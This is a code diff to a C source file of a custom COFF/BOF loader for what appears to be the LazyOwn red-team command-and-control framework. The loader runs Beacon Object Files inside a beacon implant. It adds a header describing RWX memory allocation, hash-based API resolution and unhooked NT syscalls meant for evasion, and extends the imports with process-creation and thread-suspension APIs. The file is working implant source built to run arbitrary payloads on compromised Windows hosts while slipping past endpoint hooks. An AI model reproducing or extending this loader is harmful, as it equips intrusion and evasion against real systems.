@@ -1,3 +1,86 @@
+/**
+ * ╔══════════════════════════════════════════════════════════════════════════════╗
+ * ║                         LAZYOWN REDTEAM COFF LOADER 3                        ║
+ * ║                             (Black Basalt Beacon)                            ║
+ * ╚══════════════════════════════════════════════════════════════════════════════╝
+ *
+ * ┌──────────────────────────────────────────────────────────────────────────────┐
+ * │ PURPOSE                                                                      │
+ * ├──────────────────────────────────────────────────────────────────────────────┤
+ * │ This module implements a custom COFF (Common Object File Format) loader      │
+ * │ designed specifically for the LazyOwn RedTeam C2 framework. It enables       │
+ * │ dynamic loading and execution of Beacon Object Files (BOFs) inside a         │
+ * │ Black Basalt-based beacon agent without relying on C0b4lt Str1k3.            │
+ * │                                                                              │
+ * │ The loader resolves external symbols (APIs, Beacon functions) via DJB2 hash, │
+ * │ applies x64 relocations (ADDR64, REL32, etc.), handles out-of-range jumps    │
+ * │ via trampolines, and safely invokes the target 'go' function with proper     │
+ * │ stack alignment.                                                             │
+ * │                                                                              │
+ * │ All memory allocations are RWX where needed, and no CRT functions are used   │
+ * │ to ensure maximum compatibility and evasion in locked-down environments.     │
+ * └──────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌──────────────────────────────────────────────────────────────────────────────┐
+ * │ FEATURES                                                                     │
+ * ├──────────────────────────────────────────────────────────────────────────────┤
+ * │ ✅ x64 COFF parsing & section loading                                         │
+ * │ ✅ Full support for IMAGE_REL_AMD64_* relocations                             │
+ * │ ✅ Trampoline generation for REL32 out-of-range targets                       │
+ * │ ✅ DJB2 hash-based symbol resolution (no string compares at runtime)          │
+ * │ ✅ Prefixed symbol support (e.g., "KERNEL32$CreateFileA" → "CreateFileA")     │
+ * │ ✅ Internal symbol resolution (between COFF sections)                         │
+ * │ ✅ BeaconPrintf debugging at every critical step                              │
+ * │ ✅ Stack-aligned 'go' function invocation to prevent crashes                  │
+ * │ ✅ No CRT dependencies — pure WinAPI + Beacon API                             │
+ * │ ✅ Support for unhooked NT syscalls (via g_pNt*Unhooked symbols)              │
+ * └───────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌──────────────────────────────────────────────────────────────────────────────┐
+ * │ SYMBOL RESOLUTION                                                            │
+ * ├──────────────────────────────────────────────────────────────────────────────┤
+ * │ External symbols (e.g., "__imp_CreateProcessA", "BeaconPrintf") are resolved │
+ * │ via a precomputed DJB2 hash table (`g_symbol_table`).                        │
+ * │                                                                              │
+ * │ Prefixes like "KERNEL32$", "ADVAPI32$", etc. are automatically stripped      │
+ * │ before hashing.                                                              │
+ * │                                                                              │
+ * │ Internal symbols (within the COFF) are resolved by section offset.           │
+ * └──────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌──────────────────────────────────────────────────────────────────────────────┐
+ * │ USAGE                                                                        │
+ * ├──────────────────────────────────────────────────────────────────────────────┤
+ * │ int RunCOFF(                                                                 │
+ * │     const char* functionname,  // typically "go"                             │
+ * │     unsigned char* coff_data,  // raw COFF bytes                             │
+ * │     uint32_t filesize,         // size of COFF blob                          │
+ * │     unsigned char* argumentdata, // args to pass to 'go'                     │
+ * │     int argumentSize           // length of args                             │
+ * │ );                                                                           │
+ * │                                                                              │
+ * │ Returns 0 on success, 1 on failure.                                          │
+ * └──────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌──────────────────────────────────────────────────────────────────────────────┐
+ * │ COMPATIBILITY                                                                │
+ * ├──────────────────────────────────────────────────────────────────────────────┤
+ * │ ✔ Windows x64 (tested on 10/11, Server 2016+)                                │
+ * │ ✔ GCC/MinGW-w64 compiled BOFs                                                │
+ * │ ✔ LazyOwn RedTeam C2 Framework                                               │
+ * │ ✔ Black Basalt Beacon (custom implementation)                                │
+ * │ ✘ NOT compatible with Cobalt Strike — this is a fully independent loader.    │
+ * └──────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌──────────────────────────────────────────────────────────────────────────────┐
+ * │ AUTHOR & LICENSE                                                             │
+ * ├──────────────────────────────────────────────────────────────────────────────┤
+ * │ Developed for the LazyOwn RedTeam Framework.                                 │
+ * │ © 2025 LazyOwn Project — GPLv3                                               │
+ * │ For authorized red team use only.                                            │
+ * └──────────────────────────────────────────────────────────────────────────────┘
+ */
+
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -5,7 +88,7 @@
 #include <stdint.h>
 #include "beacon.h"
 
-// === Estructuras COFF mínimas ===
+// === Estructuras COFF ===
 #pragma pack(push, 1)
 #pragma comment(linker, "/INCLUDE:__imp_BeaconPrintf")
 #pragma comment(linker, "/INCLUDE:__imp_BeaconOutput")
@@ -225,11 +308,26 @@
 #pragma comment(linker, "/INCLUDE:__imp_IsWow64Process")
 #pragma comment(linker, "/INCLUDE:__imp_Process32First")
 #pragma comment(linker, "/INCLUDE:__imp_CreateToolhelp32Snapshot")
+#pragma comment(linker, "/INCLUDE:__imp_select")
+#pragma comment(linker, "/INCLUDE:__imp_CreateProcessA")
+#pragma comment(linker, "/INCLUDE:__imp_CreateProcessW")
+#pragma comment(linker, "/INCLUDE:__imp_SuspendThread")
+#pragma comment(linker, "/INCLUDE:__imp_OpenThread")
+#pragma comment(linker, "/INCLUDE:__imp_Thread32First")
+#pragma comment(linker, "/INCLUDE:__imp_Thread32Next")
+#pragma comment(linker, "/INCLUDE:__imp_NtQueryInformationThread")
+
+
+
+
 #pragma comment(linker, "/INCLUDE:g_pNtCreateFileUnhooked")
 #pragma comment(linker, "/INCLUDE:g_pNtWriteVirtualMemoryUnhooked")
 #pragma comment(linker, "/INCLUDE:g_pNtProtectVirtualMemoryUnhooked")
 #pragma comment(linker, "/INCLUDE:g_pNtResumeThreadUnhooked")
 #pragma comment(linker, "/INCLUDE:g_pNtCreateThreadExUnhooked")
+
+
+
 
 extern PVOID __imp_BeaconPrintf;
 extern PVOID __imp_BeaconOutput;
@@ -449,13 +547,24 @@ extern PVOID __imp_Process32Next;
 extern PVOID __imp_IsWow64Process;
 extern PVOID __imp_Process32First;
 extern PVOID __imp_CreateToolhelp32Snapshot;
+extern PVOID __imp_select;
+extern PVOID __imp_CreateProcessA;
+extern PVOID __imp_CreateProcessW;
+extern PVOID __imp_SuspendThread;
+extern PVOID __imp_OpenThread;
+extern PVOID __imp_Thread32First;
+extern PVOID __imp_Thread32Next;
+extern PVOID __imp_NtQueryInformationThread;
+
+
 
 extern PVOID g_pNtCreateFileUnhooked;
 extern PVOID g_pNtWriteVirtualMemoryUnhooked;
 extern PVOID g_pNtProtectVirtualMemoryUnhooked;
 extern PVOID g_pNtResumeThreadUnhooked;
 extern PVOID g_pNtCreateThreadExUnhooked;
-// Definiciones completas de relocaciones x64 (agrega esto arriba de todo, cerca de otros #include o #define)
+
+// Definiciones completas de relocaciones x64
 #define IMAGE_REL_AMD64_ABSOLUTE    0x0000
 #define IMAGE_REL_AMD64_ADDR64      0x0001
 #define IMAGE_REL_AMD64_ADDR32      0x0002
@@ -535,7 +644,7 @@ typedef struct {
     void* ptr;
 } SymbolHash;
 
-// === Tabla de símbolos por hash (djb2) - GENERADA AUTOMÁTICAMENTE ===
+// === Tabla de símbolos por hash (djb2)
 static SymbolHash g_symbol_table[] = {
     // === Funciones Beacon ===
     { 0xE2494BA2, (void*)BeaconDataParse },                  // "BeaconDataParse"
@@ -759,6 +868,18 @@ static SymbolHash g_symbol_table[] = {
     { 0xB9A0744A, (void*)&__imp_IsWow64Process },
     { 0xAC11E754, (void*)&__imp_Process32First },
     { 0xFD247938, (void*)&__imp_CreateToolhelp32Snapshot },
+    { 0x42F6DFA8, (void*)&__imp_select },
+    { 0xC84E5CFC, (void*)&__imp_CreateProcessA },
+    { 0xC84E5D12, (void*)&__imp_CreateProcessW },
+    { 0x27E4B0E2, (void*)&__imp_SuspendThread },
+    { 0x2873ECF2, (void*)&__imp_OpenThread },
+    { 0x2EF1F8CD, (void*)&__imp_Thread32First },    
+    { 0x2FFC2404, (void*)&__imp_Thread32Next },   
+    { 0x5FBE7B3E, (void*)&__imp_NtQueryInformationThread },   
+
+
+
+    
     { 0xE60AAD2E, (void*)&g_pNtCreateFileUnhooked },
     { 0x4D6684E5, (void*)&g_pNtWriteVirtualMemoryUnhooked },
     { 0x51115B9B, (void*)&g_pNtProtectVirtualMemoryUnhooked },
@@ -791,14 +912,14 @@ static int   g_trampoline_offset = 0;
 
 static void* create_trampoline(void* target) {
     if (!target) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ create_trampoline nulled target=NULL\n");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF] create_trampoline nulled target=NULL\n");
         return NULL;
     }
 
     // Allocate executable memory for trampoline
     void* trampoline = VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!trampoline) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ can't assign memory to trampolín\n");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF] can't assign memory to trampolín\n");
         return NULL;
     }
     
@@ -813,13 +934,13 @@ static void* create_trampoline(void* target) {
     code[10] = 0xFF; // JMP
     code[11] = 0xE0; // /4 rax
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🚀 Trampolín created in %p -> %p \n", trampoline, target);
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Trampolín created in %p -> %p \n", trampoline, target);
     return trampoline;
 }
 BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target, 
                       void** sections, const char* sym_name, void* base_addr) {
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🔧 Apply reloc type %d in 0x%p -> 0x%p \n", 
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Apply reloc type %d in 0x%p -> 0x%p \n", 
                 rel->Type, patch_addr, target);
     
     switch (rel->Type) {
@@ -831,7 +952,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_ADDR64: {
             DWORD oldProtect;
             if (!VirtualProtect(patch_addr, sizeof(uint64_t), PAGE_READWRITE, &oldProtect)) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ can't change the protection to ADDR64 \n");
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] can't change the protection to ADDR64 \n");
                 return FALSE;
             }
             *(uint64_t*)patch_addr = (uint64_t)target;
@@ -842,7 +963,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         
         case IMAGE_REL_AMD64_ADDR32: {
             if ((uint64_t)target > 0xFFFFFFFF) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ ADDR32: addres out of range 32-bit\n");
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] ADDR32: addres out of range 32-bit\n");
                 return FALSE;
             }
             *(uint32_t*)patch_addr = (uint32_t)(uintptr_t)target;
@@ -867,15 +988,15 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
             if (offset < INT32_MIN || offset > INT32_MAX) {
                 void* trampoline = create_trampoline(target);
                 if (!trampoline) {
-                    BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Trampolín failed to '%s' \n", sym_name);
+                    BeaconPrintf(CALLBACK_ERROR, "[BOF] Trampolín failed to '%s' \n", sym_name);
                     return FALSE;
                 }
                 offset = (int64_t)trampoline - ((int64_t)patch_addr + 4);
                 if (offset < INT32_MIN || offset > INT32_MAX) {
-                    BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Trampolín out range to '%s' \n", sym_name);
+                    BeaconPrintf(CALLBACK_ERROR, "[BOF] Trampolín out range to '%s' \n", sym_name);
                     return FALSE;
                 }
-                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🚀 doing trampolin '%s': %p \n", sym_name, trampoline);
+                BeaconPrintf(CALLBACK_OUTPUT, "[BOF] doing trampolin '%s': %p \n", sym_name, trampoline);
             }
             *(int32_t*)patch_addr = (int32_t)offset;
             BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Applied IMAGE_REL_AMD64_REL32: 0x%X \n", (int32_t)offset);
@@ -885,7 +1006,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_REL32_1: {
             int64_t offset = (int64_t)target - ((int64_t)patch_addr + 5);
             if (offset < INT32_MIN || offset > INT32_MAX) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_1 out range to '%s' \n", sym_name);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] REL32_1 out range to '%s' \n", sym_name);
                 return FALSE;
             }
             *(int32_t*)patch_addr = (int32_t)offset;
@@ -896,7 +1017,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_REL32_2: {
             int64_t offset = (int64_t)target - ((int64_t)patch_addr + 6);
             if (offset < INT32_MIN || offset > INT32_MAX) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_2 out range to '%s' \n", sym_name);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] REL32_2 out range to '%s' \n", sym_name);
                 return FALSE;
             }
             *(int32_t*)patch_addr = (int32_t)offset;
@@ -907,7 +1028,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_REL32_3: {
             int64_t offset = (int64_t)target - ((int64_t)patch_addr + 7);
             if (offset < INT32_MIN || offset > INT32_MAX) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_3 out range to '%s'\n", sym_name);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] REL32_3 out range to '%s'\n", sym_name);
                 return FALSE;
             }
             *(int32_t*)patch_addr = (int32_t)offset;
@@ -918,7 +1039,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_REL32_4: {
             int64_t offset = (int64_t)target - ((int64_t)patch_addr + 8);
             if (offset < INT32_MIN || offset > INT32_MAX) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_4 out range to '%s'\n", sym_name);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] REL32_4 out range to '%s'\n", sym_name);
                 return FALSE;
             }
             *(int32_t*)patch_addr = (int32_t)offset;
@@ -929,7 +1050,7 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_REL32_5: {
             int64_t offset = (int64_t)target - ((int64_t)patch_addr + 9);
             if (offset < INT32_MIN || offset > INT32_MAX) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ REL32_5 out range to '%s' \n", sym_name);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] REL32_5 out range to '%s' \n", sym_name);
                 return FALSE;
             }
             *(int32_t*)patch_addr = (int32_t)offset;
@@ -944,12 +1065,12 @@ BOOL handle_relocation(COFFRelocation* rel, void* patch_addr, void* target,
         case IMAGE_REL_AMD64_SREL32:
         case IMAGE_REL_AMD64_PAIR:
         case IMAGE_REL_AMD64_SSPAN32: {
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ Type %d not implemented to '%s'\n", rel->Type, sym_name);
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] Type %d not implemented to '%s'\n", rel->Type, sym_name);
             return FALSE;
         }
         
         default: {
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Type of rellocation x64 unknown: %d para '%s'\n", 
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] Type of rellocation x64 unknown: %d para '%s'\n", 
                         rel->Type, sym_name);
             return FALSE;
         }
@@ -1003,7 +1124,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
 
     void** sections = calloc(hdr->NumberOfSections, sizeof(void*));
     if (!sections) {
-        BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ calloc failed \n");
+        BeaconPrintf(CALLBACK_ERROR, "[BOF] calloc failed \n");
         return 1;
     }
 
@@ -1015,13 +1136,13 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         BeaconPrintf(CALLBACK_ERROR, "[BOF] VirtualAlloc section %d (size: %zu)\n", i, size);
         sections[i] = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!sections[i]) {
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ VirtualAlloc failed to section %d \n", i);
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] VirtualAlloc failed to section %d \n", i);
             goto cleanup;
         }
 
         if (sect[i].PointerToRawData && sect[i].SizeOfRawData > 0) {
             if (sect[i].PointerToRawData + sect[i].SizeOfRawData > filesize) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ DAta out of range %d \n", i);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] DAta out of range %d \n", i);
                 goto cleanup;
             }
             memcpy(sections[i], coff_data + sect[i].PointerToRawData, sect[i].SizeOfRawData);
@@ -1035,13 +1156,13 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         if (!sect[i].PointerToRelocations || sect[i].NumberOfRelocations == 0) continue;
 
         if (sect[i].PointerToRelocations >= filesize) {
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ PointerToRelocations section out of range %d \n", i);
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] PointerToRelocations section out of range %d \n", i);
             continue;
         }
 
         size_t total_reloc_size = (size_t)sect[i].NumberOfRelocations * sizeof(COFFRelocation);
         if (sect[i].PointerToRelocations + total_reloc_size > filesize) {
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Buffer to small to rellocate section %d \n", i);
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] Buffer to small to rellocate section %d \n", i);
             continue;
         }
 
@@ -1052,14 +1173,14 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
             COFFRelocation* rel = &rel_start[j];
 
             if (rel->SymbolTableIndex >= hdr->NumberOfSymbols) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ SymbolTableIndex %d out of range \n", rel->SymbolTableIndex);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] SymbolTableIndex %d out of range \n", rel->SymbolTableIndex);
                 continue;
             }
 
             COFFSymbol* s = &sym[rel->SymbolTableIndex];
             char* sym_name = get_symbol_name(s, strtab, strtab_size);
             if (!sym_name) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ Simbol name CORRUPT (index %d) \n", rel->SymbolTableIndex);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] Simbol name CORRUPT (index %d) \n", rel->SymbolTableIndex);
                 continue;
             }
 
@@ -1083,16 +1204,16 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 search_name = sym_name + 9;
             }
 
-            // ✅ LOG DEL HASH — ¡CRUCIAL PARA DEPURAR!
+            // LOG DEL HASH — ¡CRUCIAL PARA DEPURAR!
             uint32_t name_hash = djb2_hash(search_name);
-            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] 🔍 Searching Simbol: '%s' (original: '%s') → HASH=0x%08X \n", search_name, sym_name, name_hash);
+            BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Searching Simbol: '%s' (original: '%s') → HASH=0x%08X \n", search_name, sym_name, name_hash);
 
             void* target = NULL;
             char* patch_addr = (char*)sections[i] + rel->VirtualAddress;
 
             if (s->SectionNumber > 0) {
                 if (s->SectionNumber - 1 >= hdr->NumberOfSections) {
-                    BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ SectionNumber %d invalid \n", s->SectionNumber);
+                    BeaconPrintf(CALLBACK_ERROR, "[BOF] SectionNumber %d invalid \n", s->SectionNumber);
                     continue;
                 }
                 
@@ -1113,18 +1234,18 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
             }
 
             if (!target) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ SIMBOL NOT SOLVED: '%s' (hash=0x%08X) \n", search_name, name_hash);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] SIMBOL NOT SOLVED: '%s' (hash=0x%08X) \n", search_name, name_hash);
                 continue;
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ✅ Solved '%s' → %p", search_name, target);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] Solved '%s' → %p", search_name, target);
             }
 
             if (rel->VirtualAddress >= sect[i].SizeOfRawData) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ VirtualAddress out of range %d \n", i);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] VirtualAddress out of range %d \n", i);
                 continue;
             }
 
-            // ✅ Detecta si la reloc ya fue aplicada (evita sobrescritura)
+            // Detecta si la reloc ya fue aplicada (evita sobrescritura)
             int32_t current_offset = *(int32_t*)patch_addr;
             int32_t expected_offset = (int32_t)((int64_t)target - ((int64_t)patch_addr + 4));
             if (current_offset == expected_offset) {
@@ -1136,7 +1257,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
 #ifdef _WIN64
             const char* resolved_sym_name = sym_name; // Usamos el nombre que ya obtuvimos antes
             if (!handle_relocation(rel, patch_addr, target, sections, resolved_sym_name, /*base_addr*/ NULL)) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Failed rellocation type %d \n", rel->Type);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] Failed rellocation type %d \n", rel->Type);
                 continue;
             }
 #else
@@ -1147,7 +1268,7 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
                 *(uint32_t*)patch_addr = (uint32_t)target;
                 BeaconPrintf(CALLBACK_ERROR, "[BOF] Applied IMAGE_REL_I386_DIR32 \n");
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ⚠️ Type of rellocation x86 unknown: %d \n", rel->Type);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] Type of rellocation x86 unknown: %d \n", rel->Type);
             }
 #endif
         }
@@ -1185,11 +1306,11 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
 
         if (strcmp(sym_name, functionname) == 0) {
             if (sym[i].SectionNumber <= 0 || sym[i].SectionNumber > hdr->NumberOfSections) {
-                BeaconPrintf(CALLBACK_ERROR, "[BOF] ❌ Invalid section to '%s': %d \n", functionname, sym[i].SectionNumber);
+                BeaconPrintf(CALLBACK_ERROR, "[BOF] Invalid section to '%s': %d \n", functionname, sym[i].SectionNumber);
                 continue;
             }
             go = (bof_func_t)((char*)sections[sym[i].SectionNumber - 1] + sym[i].Value);
-            BeaconPrintf(CALLBACK_ERROR, "[BOF] ✅ Func '%s' found in section %d, offset 0x%X → %p \n", 
+            BeaconPrintf(CALLBACK_ERROR, "[BOF] Func '%s' found in section %d, offset 0x%X → %p \n", 
                         functionname, sym[i].SectionNumber, sym[i].Value, go);
             break;
         }
@@ -1213,12 +1334,12 @@ int RunCOFF(const char* functionname, unsigned char* coff_data, uint32_t filesiz
         VirtualQuery((void*)((uintptr_t)&mbi & ~0xFFF), &mbi, sizeof(mbi));
         BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] stack: base=%p  size=%p  prot=%08X \n",
                     mbi.BaseAddress, mbi.RegionSize, mbi.Protect);
-        // ✅ Llamada ALINEADA — ¡CRUCIAL PARA BOFs GRANDES!
+        // Llamada ALINEADA — ¡CRUCIAL PARA BOFs GRANDES!
         call_go_aligned(go, (char*)argumentdata, argumentSize);
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[COFF] ✅ End '%s'\n", functionname);
+        BeaconPrintf(CALLBACK_OUTPUT, "[COFF] End '%s'\n", functionname);
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[COFF] ❌ Func '%s' not found\n", functionname);
+        BeaconPrintf(CALLBACK_ERROR, "[COFF] Func '%s' not found\n", functionname);
     }
 
 cleanup:
